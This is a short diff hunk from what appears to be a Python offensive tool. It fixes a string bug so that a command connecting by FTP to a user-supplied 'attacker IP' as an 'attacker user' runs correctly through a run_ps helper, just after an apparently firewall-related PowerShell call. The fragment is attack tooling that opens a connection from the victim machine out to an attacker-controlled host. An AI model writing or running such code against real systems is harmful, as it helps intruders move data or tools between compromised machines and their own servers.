@@ -250,7 +250,7 @@ while True:
         run_ps(fwr21)
         ftpuser=input("Enter attacker user: ")
         ftpIP=input("Enter attacker IP: ")
-        ftpconnect="ftp "+ftpuser+"@"+"ftpIP"
+        ftpconnect="ftp "+ftpuser+"@"+ftpIP
         run_ps(ftpconnect)
     
     else:
